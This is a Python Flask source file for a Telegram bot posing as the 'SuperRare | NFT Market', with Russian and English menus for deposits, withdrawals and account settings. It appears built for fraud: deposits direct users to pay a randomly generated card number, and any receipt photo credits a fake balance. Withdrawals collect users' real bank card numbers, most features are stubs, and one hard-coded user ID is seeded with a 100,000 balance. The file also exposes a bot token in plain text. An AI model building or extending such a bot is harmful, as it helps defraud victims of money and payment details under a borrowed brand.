import sqlite3
import requests
import datetime
import time
import os
import threading
import random
from flask import Flask, request

app = Flask(__name__)

# ==================== КОНФИГ ====================
BOT_TOKEN = "8583960432:AAFnqFYa9iHn-08KM1HQnJpLG3qQ3zUdPdY"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ==================== ФУНКЦИЯ САМОПРОБУЖДЕНИЯ ====================
def keep_alive():
    """Функция для поддержания бота активным на Render"""
    while True:
        try:
            app_url = os.environ.get('RENDER_EXTERNAL_URL')
            if app_url:
                response = requests.get(f"{app_url}/", timeout=10)
                print(f"✅ Самопробуждение: {response.status_code} - {datetime.datetime.now().strftime('%H:%M:%S')}")
        except Exception as e:
            print(f"❌ Ошибка самопробуждения: {e}")
        time.sleep(600)

# Запускаем самопробуждение в отдельном потоке
if os.environ.get('RENDER'):
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()

# ==================== ТЕКСТЫ ====================
TEXTS = {
    "ru": {
        "choose_currency": "Выберите валюту",
        "main_menu": "Главное меню",
        "personal_account": "Личный кабинет",
        "nft": "NFT",
        "info": "Инфо",
        "support": "Тех. Поддержка",
        "in_development": "Раздел в разработке",
        "deposit_methods": "Выберите удобный для вас метод пополнения.",
        "enter_amount": "Введите сумму пополнения от {min_amount} {currency}",
        "payment_created": "Создана заявка на оплату\n\nДля пополнения переведите указанную сумму по номеру карты.\n\n---\n\n✅ Карта: {card_number}\n✅ Сумма: {amount} {currency}\n\n---\n\n**Реквизиты действительны 10 минут.**",
        "send_receipt": "Просим направить фотографию квитанции об оплате.\n\nОбращаем внимание: отправка допускается исключительно в переписке с ботом.",
        "payment_cancelled": "Заявка на оплату отменена.",
        "payment_received": "✅ Спасибо! Ваша заявка принята в обработку. Ожидайте подтверждения оплаты.",
        "withdrawal_minimum": "Минимальная сумма для вывода: {min_withdrawal} {currency}\n\nВаш баланс: {balance} {currency}, {message}",
        "enter_withdrawal_amount": "Введите сумму для вывода (от {min_withdrawal} {currency}):",
        "insufficient_funds": "недостаточно средств для вывода!",
        "sufficient_funds": "можно вывести средства",
        "enter_card_details": "Введите номер банковской карты для получения средств:",
        "withdrawal_success": "✅ Заявка на вывод создана!\n\n💳 Карта: {card_number}\n💵 Сумма: {amount} {currency}\n\n⏰ Деньги поступят в течение 24 часов.\n\nСпасибо, что пользуетесь нашим сервисом!",
        "invalid_card": "❌ Неверный номер карты. Пожалуйста, введите корректный номер банковской карты:",
        "invalid_withdrawal_amount": "❌ Неверная сумма. Минимальная сумма для вывода: {min_withdrawal} {currency}. Максимальная: {balance} {currency}",
        "personal_account_text": """**SuperRare | NFT Market**

---

## Личный кабинет

Баланс: {balance} {currency}
На выводе: {withdrawal_balance} {currency}

Оборот транзакций: {turnover} {currency}

Верификация: {verification_status}
Ваш айди: {user_id}

Дата и время: {current_time}
---""",
        "settings": "⚙️ Настройки",
        "settings_text": """**SuperRare | NFT Market**

---

## Настройки

Язык: {language}
Валюта: {currency}

---""",
        "language": "Язык",
        "currency_setting": "Валюта",
        "back": "Вернуться"
    },
    "en": {
        "choose_currency": "Choose currency",
        "main_menu": "Main menu",
        "personal_account": "Personal account",
        "nft": "NFT",
        "info": "Info",
        "support": "Support",
        "in_development": "Section in development",
        "deposit_methods": "Choose a convenient deposit method for you.",
        "enter_amount": "Enter deposit amount from {min_amount} {currency}",
        "payment_created": "Payment request created\n\nTo top up, transfer the specified amount to the card number.\n\n---\n\n✅ Card: {card_number}\n✅ Amount: {amount} {currency}\n\n---\n\n**Details are valid for 10 minutes.**",
        "send_receipt": "Please send a photo of the payment receipt.\n\nPlease note: sending is allowed only in correspondence with the bot.",
        "payment_cancelled": "Payment request cancelled.",
        "payment_received": "✅ Thank you! Your application has been accepted for processing. Please wait for payment confirmation.",
        "withdrawal_minimum": "Minimum withdrawal amount: {min_withdrawal} {currency}\n\nYour balance: {balance} {currency}, {message}",
        "enter_withdrawal_amount": "Enter withdrawal amount (from {min_withdrawal} {currency}):",
        "insufficient_funds": "insufficient funds for withdrawal!",
        "sufficient_funds": "you can withdraw funds",
        "enter_card_details": "Enter bank card number to receive funds:",
        "withdrawal_success": "✅ Withdrawal request created!\n\n💳 Card: {card_number}\n💵 Amount: {amount} {currency}\n\n⏰ Money will arrive within 24 hours.\n\nThank you for using our service!",
        "invalid_card": "❌ Invalid card number. Please enter correct bank card number:",
        "invalid_withdrawal_amount": "❌ Invalid amount. Minimum withdrawal amount: {min_withdrawal} {currency}. Maximum: {balance} {currency}",
        "personal_account_text": """**SuperRare | NFT Market**

---

## Personal Account

Balance: {balance} {currency}
On withdrawal: {withdrawal_balance} {currency}

Transaction turnover: {turnover} {currency}

Verification: {verification_status}
Your ID: {user_id}

Date and time: {current_time}
---""",
        "settings": "⚙️ Settings",
        "settings_text": """**SuperRare | NFT Market**

---

## Settings

Language: {language}
Currency: {currency}

---""",
        "language": "Language",
        "currency_setting": "Currency",
        "back": "Back"
    }
}

# ==================== КЛАВИАТУРЫ ====================
def agreement_keyboard(lang='ru'):
    text = "✅ Принять" if lang == 'ru' else "✅ Accept"
    return {"keyboard": [[{"text": text}]], "resize_keyboard": True}

def language_keyboard():
    return {"keyboard": [[{"text": "Русский"}], [{"text": "English"}]], "resize_keyboard": True}

def currency_keyboard():
    return {"keyboard": [[{"text": "RUB"}, {"text": "UAH"}, {"text": "KZT"}], [{"text": "BYN"}, {"text": "EUR"}, {"text": "USD"}]], "resize_keyboard": True}

def main_menu_keyboard(lang='ru'):
    personal_text = TEXTS[lang]["personal_account"]
    nft_text = TEXTS[lang]["nft"]
    info_text = TEXTS[lang]["info"]
    support_text = TEXTS[lang]["support"]
    return {"keyboard": [[{"text": "📊 " + personal_text}], [{"text": "💎 " + nft_text}], [{"text": "ℹ️ " + info_text}], [{"text": "🆘 " + support_text}]], "resize_keyboard": True}

def personal_account_keyboard(lang='ru'):
    deposit_text = "Пополнить" if lang == 'ru' else "Deposit"
    withdraw_text = "Вывести" if lang == 'ru' else "Withdraw"
    transactions_text = "Транзакции" if lang == 'ru' else "Transactions"
    verification_text = "Верификация" if lang == 'ru' else "Verification"
    favorites_text = "Избранное" if lang == 'ru' else "Favorites"
    my_nft_text = "Мои NFT" if lang == 'ru' else "My NFT"
    create_nft_text = "Создать NFT" if lang == 'ru' else "Create NFT"
    settings_text = TEXTS[lang]["settings"]
    menu_text = "Меню" if lang == 'ru' else "Menu"
    return {"keyboard": [[{"text": deposit_text}, {"text": withdraw_text}], [{"text": transactions_text}, {"text": verification_text}], [{"text": favorites_text}, {"text": my_nft_text}], [{"text": create_nft_text}], [{"text": settings_text}, {"text": menu_text}]], "resize_keyboard": True}

def settings_keyboard(lang='ru'):
    language_text = TEXTS[lang]["language"]
    currency_text = TEXTS[lang]["currency_setting"]
    back_text = TEXTS[lang]["back"]
    return {"keyboard": [[{"text": language_text}], [{"text": currency_text}], [{"text": back_text}]], "resize_keyboard": True}

def deposit_methods_keyboard(lang='ru'):
    bank_card_text = "Пополнить через банковскую карту" if lang == 'ru' else "Deposit by bank card"
    promocode_text = "Промокод" if lang == 'ru' else "Promocode"
    back_text = "Назад" if lang == 'ru' else "Back"
    return {"keyboard": [[{"text": bank_card_text}], [{"text": promocode_text}], [{"text": back_text}]], "resize_keyboard": True}

def payment_confirmation_keyboard(lang='ru'):
    paid_text = "Я оплатил(а) ✅" if lang == 'ru' else "I paid ✅"
    cancel_text = "Отменить" if lang == 'ru' else "Cancel"
    return {"keyboard": [[{"text": paid_text}], [{"text": cancel_text}]], "resize_keyboard": True}

def withdrawal_cancel_keyboard(lang='ru'):
    cancel_text = "Отменить" if lang == 'ru' else "Cancel"
    return {"keyboard": [[{"text": cancel_text}]], "resize_keyboard": True}

def back_keyboard(lang='ru'):
    back_text = TEXTS[lang]["back"]
    return {"keyboard": [[{"text": back_text}]], "resize_keyboard": True}

# ==================== БАЗА ДАННЫХ ====================
def init_db():
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    
    # Создаем таблицу temporary_data если ее нет
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS temporary_data (
            user_id INTEGER,
            key TEXT,
            value TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (user_id, key)
        )
    ''')
    
    # Проверяем существующие таблицы и создаем если их нет
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            full_name TEXT,
            language TEXT DEFAULT 'ru',
            currency TEXT DEFAULT 'RUB',
            balance REAL DEFAULT 0.0,
            withdrawal_balance REAL DEFAULT 0.0,
            turnover REAL DEFAULT 0.0,
            verified INTEGER DEFAULT 0,
            agreed INTEGER DEFAULT 0,
            state TEXT DEFAULT 'start',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            currency TEXT,
            card_number TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            currency TEXT,
            card_number TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Устанавливаем баланс 100000 для пользователя с ID 70038917
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, balance, state, agreed, currency) 
        VALUES (70038917, 100000.0, 'main_menu', 1, 'RUB')
    ''')
    
    conn.commit()
    conn.close()
    print("✅ База данных инициализирована!")

# ==================== УТИЛИТЫ ====================
def get_user_data(user_id):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT state, username, language, currency, balance FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result

def get_full_user_data(user_id):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result

def update_user_state(user_id, state):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET state = ?, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?', (state, user_id))
    conn.commit()
    conn.close()

def update_user_language(user_id, language):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET language = ?, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?', (language, user_id))
    conn.commit()
    conn.close()

def update_user_currency(user_id, currency):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET currency = ?, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?', (currency, user_id))
    conn.commit()
    conn.close()

def update_user_balance(user_id, amount):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET balance = balance - ?, withdrawal_balance = withdrawal_balance + ?, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?', (amount, amount, user_id))
    conn.commit()
    conn.close()

def add_user_balance(user_id, amount):
    """Добавляет средства на баланс пользователя"""
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET balance = balance + ?, turnover = turnover + ?, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?', (amount, amount, user_id))
    conn.commit()
    conn.close()

def create_payment(user_id, amount, currency):
    # Генерируем случайный номер карты для демонстрации
    card_number = '2200' + ''.join([str(random.randint(0, 9)) for _ in range(12)])
    
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('INSERT INTO payments (user_id, amount, currency, card_number) VALUES (?, ?, ?, ?)', 
                  (user_id, amount, currency, card_number))
    payment_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return payment_id, card_number

def create_withdrawal(user_id, amount, currency, card_number):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('INSERT INTO withdrawals (user_id, amount, currency, card_number) VALUES (?, ?, ?, ?)', 
                  (user_id, amount, currency, card_number))
    withdrawal_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return withdrawal_id

def get_last_payment(user_id):
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM payments WHERE user_id = ? ORDER BY id DESC LIMIT 1', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result

def save_temporary_data(user_id, key, value):
    """Сохраняет временные данные для пользователя"""
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO temporary_data (user_id, key, value) VALUES (?, ?, ?)', 
                  (user_id, key, value))
    conn.commit()
    conn.close()

def get_temporary_data(user_id, key):
    """Получает временные данные для пользователя"""
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM temporary_data WHERE user_id = ? AND key = ?', (user_id, key))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def delete_temporary_data(user_id, key):
    """Удаляет временные данные для пользователя"""
    conn = sqlite3.connect('superrare.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM temporary_data WHERE user_id = ? AND key = ?', (user_id, key))
    conn.commit()
    conn.close()

def is_valid_card(card_number):
    """Простая проверка номера карты (должен содержать только цифры и быть длиной 16-19 символов)"""
    card_number = card_number.replace(' ', '')
    return card_number.isdigit() and 16 <= len(card_number) <= 19

# ==================== ОТПРАВКА СООБЩЕНИЙ ====================
def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
    url = f"{BASE_URL}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    if parse_mode: data["parse_mode"] = parse_mode
    if reply_markup: data["reply_markup"] = reply_markup

    for attempt in range(3):
        try:
            response = requests.post(url, json=data, timeout=10)
            if response.status_code == 200: return response.json()
        except Exception as e:
            print(f"❌ Ошибка отправки: {e}")
        time.sleep(2)
    return None

# ==================== WEBHOOK ОБРАБОТЧИКИ ====================
@app.route('/')
def home():
    return "🤖 Бот работает! " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        print(f"📥 Получено обновление: {update}")  # Логируем входящие данные
        
        if 'message' in update:
            message = update['message']
            user_id = message["from"]["id"]
            text = message.get("text", "")
            username = message["from"].get("username", "")
            first_name = message["from"].get("first_name", "")
            
            # Проверяем, есть ли фото
            photo = message.get('photo')
            if photo:
                # Обработка фотографии
                handle_photo(user_id, photo, message.get('caption', ''))
                return 'ok'

            user_data = get_user_data(user_id)

            if not user_data:
                conn = sqlite3.connect('superrare.db', check_same_thread=False)
                cursor = conn.cursor()
                cursor.execute('INSERT INTO users (user_id, username, full_name, state) VALUES (?, ?, ?, ?)', (user_id, username, first_name, 'agreement'))
                conn.commit()
                conn.close()

                display_name = f"@{username}" if username else first_name
                agreement_text = f"Привет, **{display_name}!**\n\nПолитика и условия пользования данным ботом.\n\nСпасибо за понимание, Ваш **SuperRare | NFT Market**"
                send_message(user_id, agreement_text, agreement_keyboard())

            else:
                state, db_username, language, currency, balance = user_data
                lang = language or 'ru'
                curr = currency or 'RUB'

                # Обработка состояний
                if state == 'agreement':
                    accept_text = "✅ Принять" if lang == 'ru' else "✅ Accept"
                    if text == accept_text:
                        update_user_state(user_id, 'language')
                        send_message(user_id, "Выберите язык", language_keyboard())

                elif state == 'language':
                    if text == "Русский":
                        update_user_language(user_id, 'ru')
                        update_user_state(user_id, 'currency')
                        send_message(user_id, "Выберите валюту", currency_keyboard())
                    elif text == "English":
                        update_user_language(user_id, 'en')
                        update_user_state(user_id, 'currency')
                        send_message(user_id, "Choose currency", currency_keyboard())

                elif state == 'currency':
                    if text in ["RUB", "UAH", "KZT", "BYN", "EUR", "USD"]:
                        update_user_currency(user_id, text)
                        update_user_state(user_id, 'main_menu')
                        user_data = get_user_data(user_id)
                        lang = user_data[2] or 'ru'
                        send_message(user_id, TEXTS[lang]["main_menu"], main_menu_keyboard(lang))

                elif state == 'main_menu':
                    text_obj = TEXTS[lang]
                    if text == "📊 " + text_obj["personal_account"]:
                        conn = sqlite3.connect('superrare.db', check_same_thread=False)
                        cursor = conn.cursor()
                        cursor.execute('SELECT balance, withdrawal_balance, turnover, verified, currency FROM users WHERE user_id = ?', (user_id,))
                        user = cursor.fetchone()
                        conn.close()

                        if user:
                            balance, withdrawal_balance, turnover, verified, currency = user
                            verification_status = "✅ Верифицирован" if verified else "💬 Не верифицирован"
                            if lang == 'en': verification_status = "✅ Verified" if verified else "💬 Not verified"
                            current_time = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

                            account_text = text_obj["personal_account_text"].format(
                                balance=balance, withdrawal_balance=withdrawal_balance, turnover=turnover,
                                verification_status=verification_status, user_id=user_id, current_time=current_time, currency=currency
                            )
                            send_message(user_id, account_text, personal_account_keyboard(lang))
                            update_user_state(user_id, 'personal_account')

                    elif text in ["💎 " + text_obj["nft"], "ℹ️ " + text_obj["info"], "🆘 " + text_obj["support"]]:
                        send_message(user_id, text_obj["in_development"])

                elif state == 'personal_account':
                    text_obj = TEXTS[lang]
                    deposit_text = "Пополнить" if lang == 'ru' else "Deposit"
                    withdraw_text = "Вывести" if lang == 'ru' else "Withdraw"
                    transactions_text = "Транзакции" if lang == 'ru' else "Transactions"
                    verification_text = "Верификация" if lang == 'ru' else "Verification"
                    favorites_text = "Избранное" if lang == 'ru' else "Favorites"
                    my_nft_text = "Мои NFT" if lang == 'ru' else "My NFT"
                    create_nft_text = "Создать NFT" if lang == 'ru' else "Create NFT"
                    settings_text = text_obj["settings"]
                    menu_text = "Меню" if lang == 'ru' else "Menu"

                    if text == deposit_text:
                        update_user_state(user_id, 'deposit_methods')
                        send_message(user_id, text_obj["deposit_methods"], deposit_methods_keyboard(lang))
                    elif text == withdraw_text:
                        # Проверяем баланс пользователя
                        min_withdrawal = 5000.0 if curr == 'RUB' else 100.0
                        user_balance = balance
                        
                        if user_balance >= min_withdrawal:
                            # Достаточно средств - переходим к вводу суммы
                            update_user_state(user_id, 'enter_withdrawal_amount')
                            send_message(user_id, text_obj["enter_withdrawal_amount"].format(min_withdrawal=min_withdrawal, currency=curr), withdrawal_cancel_keyboard(lang))
                        else:
                            # Недостаточно средств - показываем сообщение как на скрине
                            message_text = text_obj["insufficient_funds"] if user_balance < min_withdrawal else text_obj["sufficient_funds"]
                            withdrawal_text = text_obj["withdrawal_minimum"].format(
                                min_withdrawal=min_withdrawal, 
                                balance=user_balance, 
                                currency=curr, 
                                message=message_text
                            )
                            send_message(user_id, withdrawal_text, personal_account_keyboard(lang))
                    
                    elif text == transactions_text:
                        send_message(user_id, text_obj["in_development"])
                    elif text == verification_text:
                        send_message(user_id, text_obj["in_development"])
                    elif text == favorites_text:
                        send_message(user_id, text_obj["in_development"])
                    elif text == my_nft_text:
                        send_message(user_id, text_obj["in_development"])
                    elif text == create_nft_text:
                        send_message(user_id, text_obj["in_development"])
                    elif text == settings_text:
                        full_user_data = get_full_user_data(user_id)
                        if full_user_data:
                            user_language = "Русский" if full_user_data[3] == 'ru' else "English"
                            user_currency = full_user_data[4] or 'RUB'
                            settings_message = text_obj["settings_text"].format(language=user_language, currency=user_currency)
                            send_message(user_id, settings_message, settings_keyboard(lang))
                            update_user_state(user_id, 'settings')
                    elif text == menu_text:
                        update_user_state(user_id, 'main_menu')
                        send_message(user_id, text_obj["main_menu"], main_menu_keyboard(lang))

                elif state == 'settings':
                    text_obj = TEXTS[lang]
                    if text == text_obj["language"]:
                        update_user_state(user_id, 'change_language')
                        send_message(user_id, "Выберите язык:", language_keyboard())
                    elif text == text_obj["currency_setting"]:
                        update_user_state(user_id, 'change_currency')
                        send_message(user_id, "Выберите валюту:", currency_keyboard())
                    elif text == text_obj["back"]:
                        update_user_state(user_id, 'personal_account')
                        conn = sqlite3.connect('superrare.db', check_same_thread=False)
                        cursor = conn.cursor()
                        cursor.execute('SELECT balance, withdrawal_balance, turnover, verified, currency FROM users WHERE user_id = ?', (user_id,))
                        user = cursor.fetchone()
                        conn.close()
                        if user:
                            balance, withdrawal_balance, turnover, verified, currency = user
                            verification_status = "✅ Верифицирован" if verified else "💬 Не верифицирован"
                            if lang == 'en': verification_status = "✅ Verified" if verified else "💬 Not verified"
                            current_time = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                            account_text = text_obj["personal_account_text"].format(
                                balance=balance, withdrawal_balance=withdrawal_balance, turnover=turnover,
                                verification_status=verification_status, user_id=user_id, current_time=current_time, currency=currency
                            )
                            send_message(user_id, account_text, personal_account_keyboard(lang))

                elif state == 'change_language':
                    if text == "Русский":
                        update_user_language(user_id, 'ru')
                        update_user_state(user_id, 'settings')
                        send_message(user_id, "Язык изменен на Русский", settings_keyboard('ru'))
                    elif text == "English":
                        update_user_language(user_id, 'en')
                        update_user_state(user_id, 'settings')
                        send_message(user_id, "Language changed to English", settings_keyboard('en'))

                elif state == 'change_currency':
                    if text in ["RUB", "UAH", "KZT", "BYN", "EUR", "USD"]:
                        update_user_currency(user_id, text)
                        update_user_state(user_id, 'settings')
                        user_data = get_user_data(user_id)
                        lang = user_data[2] or 'ru'
                        currency_name = "Рубль" if text == "RUB" else text
                        if lang == 'en': currency_name = "Ruble" if text == "RUB" else text
                        send_message(user_id, f"Валюта изменена на {currency_name}", settings_keyboard(lang))

                elif state == 'deposit_methods':
                    text_obj = TEXTS[lang]
                    bank_card_text = "Пополнить через банковскую карту" if lang == 'ru' else "Deposit by bank card"
                    back_text = "Назад" if lang == 'ru' else "Back"

                    if text == bank_card_text:
                        update_user_state(user_id, 'enter_amount')
                        min_amount = 2500.0 if curr == 'RUB' else 50.0
                        send_message(user_id, text_obj["enter_amount"].format(min_amount=min_amount, currency=curr), back_keyboard(lang))
                    elif text == back_text:
                        update_user_state(user_id, 'personal_account')
                        send_message(user_id, TEXTS[lang]["personal_account"], personal_account_keyboard(lang))

                elif state == 'enter_amount':
                    text_obj = TEXTS[lang]
                    back_text = "Назад" if lang == 'ru' else "Back"

                    if text == back_text:
                        update_user_state(user_id, 'deposit_methods')
                        send_message(user_id, text_obj["deposit_methods"], deposit_methods_keyboard(lang))
                    else:
                        try:
                            amount = float(text)
                            min_amount = 2500.0 if curr == 'RUB' else 50.0
                            if amount >= min_amount:
                                payment_id, card_number = create_payment(user_id, amount, curr)
                                payment_text = text_obj["payment_created"].format(card_number=card_number, amount=amount, currency=curr)
                                update_user_state(user_id, 'payment_confirmation')
                                send_message(user_id, payment_text, payment_confirmation_keyboard(lang))
                            else:
                                send_message(user_id, f"Минимальная сумма: {min_amount} {curr}")
                        except ValueError:
                            send_message(user_id, "Пожалуйста, введите число")

                elif state == 'payment_confirmation':
                    text_obj = TEXTS[lang]
                    paid_text = "Я оплатил(а) ✅" if lang == 'ru' else "I paid ✅"
                    cancel_text = "Отменить" if lang == 'ru' else "Cancel"

                    if text == paid_text:
                        # Пользователь нажал "Я оплатил"
                        update_user_state(user_id, 'waiting_receipt')
                        send_message(user_id, text_obj["send_receipt"])
                    elif text == cancel_text:
                        update_user_state(user_id, 'personal_account')
                        send_message(user_id, text_obj["payment_cancelled"], personal_account_keyboard(lang))

                elif state == 'waiting_receipt':
                    # В этом состоянии бот ждет фото, которое обрабатывается в handle_photo
                    # Если пользователь отправил текст вместо фото
                    if text:
                        send_message(user_id, "Пожалуйста, отправьте фотографию квитанции об оплате")

                # ==================== ВЫВОД СРЕДСТВ ====================
                elif state == 'enter_withdrawal_amount':
                    text_obj = TEXTS[lang]
                    cancel_text = "Отменить" if lang == 'ru' else "Cancel"

                    if text == cancel_text:
                        update_user_state(user_id, 'personal_account')
                        send_message(user_id, text_obj["personal_account"], personal_account_keyboard(lang))
                    else:
                        try:
                            amount = float(text)
                            min_withdrawal = 5000.0 if curr == 'RUB' else 100.0
                            user_balance = balance
                            
                            if amount >= min_withdrawal and amount <= user_balance:
                                # Сохраняем сумму вывода во временное хранилище
                                save_temporary_data(user_id, 'withdrawal_amount', str(amount))
                                update_user_state(user_id, 'enter_withdrawal_card')
                                send_message(user_id, text_obj["enter_card_details"], withdrawal_cancel_keyboard(lang))
                            else:
                                send_message(user_id, text_obj["invalid_withdrawal_amount"].format(
                                    min_withdrawal=min_withdrawal, balance=user_balance, currency=curr
                                ), withdrawal_cancel_keyboard(lang))
                        except ValueError:
                            send_message(user_id, "Пожалуйста, введите число", withdrawal_cancel_keyboard(lang))

                elif state == 'enter_withdrawal_card':
                    text_obj = TEXTS[lang]
                    cancel_text = "Отменить" if lang == 'ru' else "Cancel"

                    if text == cancel_text:
                        update_user_state(user_id, 'personal_account')
                        send_message(user_id, text_obj["personal_account"], personal_account_keyboard(lang))
                    else:
                        if is_valid_card(text):
                            # Получаем сохраненную сумму
                            amount_str = get_temporary_data(user_id, 'withdrawal_amount')
                            
                            if amount_str:
                                amount = float(amount_str)
                                # Создаем заявку на вывод
                                withdrawal_id = create_withdrawal(user_id, amount, curr, text)
                                # Обновляем баланс пользователя
                                update_user_balance(user_id, amount)
                                
                                # Удаляем временные данные
                                delete_temporary_data(user_id, 'withdrawal_amount')
                                
                                # Отправляем сообщение об успехе
                                success_text = text_obj["withdrawal_success"].format(
                                    card_number=text, amount=amount, currency=curr
                                )
                                update_user_state(user_id, 'personal_account')
                                send_message(user_id, success_text, personal_account_keyboard(lang))
                            else:
                                send_message(user_id, "❌ Ошибка: не найдена информация о сумме вывода", personal_account_keyboard(lang))
                        else:
                            send_message(user_id, text_obj["invalid_card"], withdrawal_cancel_keyboard(lang))

                else:
                    # Если состояние неизвестно или пользователь отправил произвольный текст
                    # Возвращаем в главное меню
                    update_user_state(user_id, 'main_menu')
                    send_message(user_id, TEXTS[lang]["main_menu"], main_menu_keyboard(lang))

        return 'ok'
    except Exception as e:
        print(f"❌ Ошибка в webhook: {e}")
        return 'error', 500

def handle_photo(user_id, photo, caption=''):
    """Обработка фотографии квитанции"""
    try:
        user_data = get_user_data(user_id)
        if user_data:
            state, db_username, language, currency, balance = user_data
            lang = language or 'ru'
            text_obj = TEXTS[lang]
            
            if state == 'waiting_receipt':
                # Получаем информацию о последнем платеже
                last_payment = get_last_payment(user_id)
                if last_payment:
                    # Обновляем статус платежа
                    conn = sqlite3.connect('superrare.db', check_same_thread=False)
                    cursor = conn.cursor()
                    cursor.execute('UPDATE payments SET status = ? WHERE id = ?', ('processing', last_payment[0]))
                    
                    # Добавляем средства на баланс пользователя
                    amount = last_payment[2]  # amount из платежа
                    add_user_balance(user_id, amount)
                    
                    conn.commit()
                    conn.close()
                    
                    # Отправляем подтверждение
                    send_message(user_id, text_obj["payment_received"])
                    
                    # Возвращаем в личный кабинет
                    update_user_state(user_id, 'personal_account')
                    send_message(user_id, text_obj["personal_account"], personal_account_keyboard(lang))
                else:
                    send_message(user_id, "Ошибка: не найдена информация о платеже")
            else:
                send_message(user_id, "Пожалуйста, следуйте инструкциям бота")
    except Exception as e:
        print(f"❌ Ошибка обработки фото: {e}")

def set_webhook():
    try:
        webhook_url = f"{os.environ.get('RENDER_EXTERNAL_URL')}/webhook"
        url = f"{BASE_URL}/setWebhook?url={webhook_url}"
        response = requests.get(url)
        if response.status_code == 200:
            print("✅ Webhook установлен!")
        else:
            print(f"❌ Ошибка установки webhook: {response.text}")
    except Exception as e:
        print(f"❌ Ошибка: {e}")

# ==================== ЗАПУСК ====================
def create_app():
    """Функция для Gunicorn"""
    init_db()
    set_webhook()
    return app

# Инициализация при импорте
init_db()
set_webhook()
print("🚀 Бот инициализирован и готов к работе!")

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print(f"📍 Локальный запуск на порту {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
